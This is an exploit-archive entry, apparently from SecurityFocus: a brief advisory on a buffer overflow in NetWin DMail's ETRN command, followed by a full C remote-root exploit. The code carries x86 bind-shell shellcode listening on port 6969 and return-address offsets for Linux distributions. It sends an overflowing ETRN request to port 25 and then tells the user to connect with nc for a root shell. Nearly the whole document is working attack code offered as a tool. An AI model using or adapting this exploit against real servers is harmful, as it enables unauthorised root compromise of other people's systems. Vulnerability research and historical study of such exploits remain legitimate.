source: http://www.securityfocus.com/bid/1297/info

NetWin's DMail is an alternative mail-server solution for unix and NT servers. There is a buffer overflow vulnerability in the server daemon that could allow remote attackers to execute arbitrary commands as root or cause a denial of service. The overflow occurs when a large buffer is sent to argument the ETRN command: If over 260 characters are sent, the stack is corrupted and the mailserver will crash.

/*
Netwin DSMTP Server v2.7q remote-root exploit 
noir@gsu.linux.org.tr | noir@olympos.org

writen just for fun : ) heh, 
tested arch = x86/Linux mdk7.0
I will port this to Solaris & FreeBSD when I have time...
check http://gsu.linux.org.tr/~noir/ offsets for other Linux distros.

greetz: moog, si_ (happy birthday!), CronoS, still, teso crew, 
gsu-linux, `B, calaz, olympos secteam

FOUND BY Eric Andry eric@wincom.net
*/  
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netdb.h>
#include <netinet/in.h>
#include <sys/time.h>


unsigned char shellcode[]=  /* noir@olympos.org */
"\x31\xc0\x40\x40\x89\x45\xf4\x48\x89\x45\xf8\x48\x89"
"\x45\xfc\xb0\x66\x31\xdb\x43\x8d\x4d\xf4\xcd\x80\x31"
"\xdb\x43\x43\x66\x89\x5d\xec\x66\xc7\x45\xee\x1b\x39"
"\x31\xdb\x89\x5d\xf0\x89\x45\xf4\x89\xc2\x8d\x45\xec"
"\x89\x45\xf8\xc6\x45\xfc\x10\x31\xc0\xb0\x66\x31\xdb"
"\xb3\x02\x8d\x4d\xf4\xcd\x80\x89\x55\xf8\x31\xc0\x40"
"\x89\x45\xfc\x31\xc0\xb0\x66\x31\xdb\xb3\x04\x8d\x4d"
"\xf8\xcd\x80\x89\x55\xf4\x31\xc0\x89\x45\xf8\x89\x45"
"\xf8\x89\x45\xfc\xb0\x66\x31\xdb\xb3\x05\x8d\x4d\xf4"
"\xcd\x80\x89\xc2\x31\xc0\xb0\x3f\x89\xd3\x31\xc9\xcd"
"\x80\x31\xc0\xb0\x3f\x89\xd3\x31\xc9\xb1\x01\xcd\x80"
"\x31\xc0\xb0\x3f\x89\xd3\x31\xc9\xb1\x02\xcd\x80"
/* generic shellcode execve(args[0],args,0);  aleph1 */
"\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
"\x80\xe8\xdc\xff\xff\xff/bin/sh";




int resolv(char *hname, struct in_addr *addr);

#define RET_MDK70    0xbfff97ec
#define RET_REDHAT60 0xaabbccdd
#define RET_SLACK70  0xddccbbaa
#define NOP 0x90
#define ALIGN 1

int
main(int argc, char *argv[])
{

        int fd, n;
        int i, l;
        unsigned char ovf[860];
        char buff[200];
        int offset = 0; 
        struct sockaddr_in servaddr;
        if (argc < 2 ){
        fprintf(stderr,"%s <host> [offset]\n",argv[0]);
        exit(0); 
        }
      if(argv[2])
         offset=atoi(argv[2]); 
printf("Netwin DSMTP v2.7q remote-root exploit by noir\n");
        if( (fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0){
        perror("socket");
        exit(-1);
        }
        
        bzero(&servaddr, sizeof(servaddr));
        servaddr.sin_family = AF_INET;
        servaddr.sin_port = htons(25);
        if(!resolv(argv[1], &servaddr.sin_addr)){
        herror("gethostbyname");
        exit(-1); }
     
        if(connect(fd, (struct sockaddr *) &servaddr, sizeof(servaddr)) < 0 ){
        perror("connect");
        exit(-1);
        } 

        n = read(fd, buff, 1024);
        write(STDOUT_FILENO, buff, n);
        sleep(2);
        fprintf(stderr, "check for portshell 6969/tcp when done\n");

        memset(ovf, NOP, sizeof(ovf));
        for( i = ALIGN; i < 300; i+=4)
        *(long *) &ovf[i] = RET_MDK70 + offset; 
        for( i = 650, l = 0; l < strlen(shellcode) ;i++, l++)
        ovf[i] = shellcode[l];
        memcpy(ovf, "ETRN ", 5);
        strcpy(ovf+858,"\r\n\0");
        write(fd, ovf, strlen(ovf));
        fprintf(stderr,"done!\n$ nc %s 6969\n", argv[1]);       
        return 1;
}

int
resolv(char *hname, struct in_addr *addr)
{
        struct hostent *hp;
        
if ( (hp = gethostbyname(hname)) == NULL)
        return 0;

  memcpy((struct in_addr *)addr, (char *)hp->h_addr, sizeof(struct in_addr));
        return 1;
}